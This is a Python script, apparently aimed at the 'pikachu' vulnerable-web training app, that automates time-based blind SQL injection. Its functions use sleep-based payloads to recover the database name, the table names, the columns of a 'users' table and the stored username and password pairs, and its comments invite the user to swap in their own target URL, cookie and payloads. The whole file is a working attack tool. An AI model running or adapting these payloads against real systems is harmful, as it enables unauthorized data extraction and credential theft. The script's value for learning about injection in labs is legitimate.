#!/usr/bin/python3
# coding=utf-8

"""
functions for time-based sql injection(blind)

:copyright: Copyright (c) 2019, Fancy Xiang. All rights reserved.
:license: GNU General Public License v3.0, see LICENSE for more details.
"""

import requests

url = "http://192.168.101.16/pikachu/vul/sqli/sqli_blind_t.php"               #有可利用漏洞的url，根据实际情况填写
headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36","Cookie": "PHPSESSID=7qgjcq21lsq834acodn0mo7km3",}    #http request报文头部，根据实际情况填写
 
keylist = [chr(i) for i in range(33, 127)]                                     #包括数字、大小写字母、可见特殊字符

def CurrentDatabaseTime():
    n = 10                                                                      #预测当前数据库名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2 
    length = 0
    db = str()
    while True:
        if j>k and j<n and j-k>3:
            payload1 = "lili' and  if(length(database())>"+str(j)+",sleep(3),1)-- ss"           #所有payload根据实际情况填写
            param = {
            "name":payload1,
            "submit":"查询",
            }
            try:
                response = requests.get(url, params = param, headers = headers,timeout=2)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                k=k
                n=j     
            except:
                n=n
                k=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload2 = "lili' and  if(length(database())="+str(i)+",sleep(3),1)-- ss"
                param = {
                "name":payload2,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)
                except:
                    length = i
                    break
            break
        else:
            break
    print("the name of current database contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload3 = "lili' and if(substring(database(),"+str(i)+",1)='"+c+"',sleep(3),1)-- ss"
            param = {
            "name":payload3,
            "submit":"查询",
            }
            try:
                response = requests.get(url, params = param, headers = headers,timeout=2)
            except:
                db = db+c
                break
    print("the name of current database is "+str(db))
    
def TablesTime():
    n = 100                                                                     #预测当前数据库中所有表名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    tname = str()
    while True:
        if j>k and j<n and j-k>3:
            payload4 = "lili' and if((length((select group_concat(table_name) from information_schema.tables where table_schema = database())))>"+str(j)+",sleep(3),1)-- ss"
            param = {
            "name":payload4,
            "submit":"查询",
            }
            try:
                response = requests.get(url, params = param, headers = headers,timeout=2)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                k=k
                n=j     
            except:
                n=n
                k=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload5 = "lili' and if((length((select group_concat(table_name) from information_schema.tables where table_schema = database())))="+str(i)+",sleep(3),1)-- ss"
                param = {
                "name":payload5,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)
                except:
                    length = i
                    break
            break
        else:
            break
    print("the name of all tables in current database contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload6 = "lili' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),"+str(i)+",1)='"+c+"',sleep(3),1)-- ss"
            param = {
            "name":payload6,
            "submit":"查询",
            }
            try:
                response = requests.get(url, params = param, headers = headers,timeout=2)
            except:
                tname = tname+c
                break
    print("the name of all tables in current database is "+str(tname))


def ColumnsTime():
    n = 200                                                                     #预测某个表所有列名称最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    cname = str()
    while True:
        if j>k and j<n and j-k>3:
            payload7 = "lili' and if((length((select group_concat(column_name) from information_schema.columns where table_name = 'users')))>"+str(j)+",sleep(3),1)-- ss"
            param = {
            "name":payload7,
            "submit":"查询",
            }
            try:
                response = requests.get(url, params = param, headers = headers,timeout=2)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                k=k
                n=j     
            except:
                n=n
                k=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload8 = "lili' and if((length((select group_concat(column_name) from information_schema.columns where table_name = 'users')))="+str(i)+",sleep(3),1)-- ss"
                param = {
                "name":payload8,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)
                except:
                    length = i
                    break
            break
        else:
            break
    print("the name of all columns in current table contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload9 = "lili' and if(substr((select group_concat(column_name) from information_schema.columns where table_name = 'users'),"+str(i)+",1)='"+c+"',sleep(3),1)-- ss"
            param = {
            "name":payload9,
            "submit":"查询",
            }
            try:
                response = requests.get(url, params = param, headers = headers,timeout=2)
            except:
                cname = cname+c
                break
    print("the name of all columns in current table is "+str(cname))

def ContentTime():
    n = 200                                                                     #预测期望获取的数据的最大可能的长度，根据实际情况填写
    k = 0
    j = n//2
    length = 0
    content = str()
    while True:
        if j>k and j<n and j-k>3:
            payload10 = "lili' and if((length((select group_concat(concat(username,'^',password)) from users)))>"+str(j)+",sleep(3),1)-- ss"
            param = {
            "name":payload10,
            "submit":"查询",
            }
            try:
                response = requests.get(url, params = param, headers = headers,timeout=2)     #本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样
                k=k
                n=j     
            except:
                n=n
                k=j
            j=(n-k)//2
        elif j-k==3 or j-k<3:
            for i in range(k-1,n+2):
                payload11 = "lili' and if((length((select group_concat(concat(username,'^',password)) from users)))="+str(i)+",sleep(3),1)-- ss"
                param = {
                "name":payload11,
                "submit":"查询",
                }
                try:
                    response = requests.get(url, params = param, headers = headers,timeout=2)
                except:
                    length = i
                    break
            break
        else:
            break
    print("the content contains "+str(length)+" characters")
    
    for i in range(1,length+1):
        for c in keylist:
            payload12 = "lili' and if(substr((select group_concat(concat(username,'^',password)) from users),"+str(i)+",1)='"+c+"',sleep(3),1)-- ss"
            param = {
            "name":payload12,
            "submit":"查询",
            }
            try:
                response = requests.get(url, params = param, headers = headers,timeout=2)
            except:
                content = content+c
                break
    print("the content is "+str(content))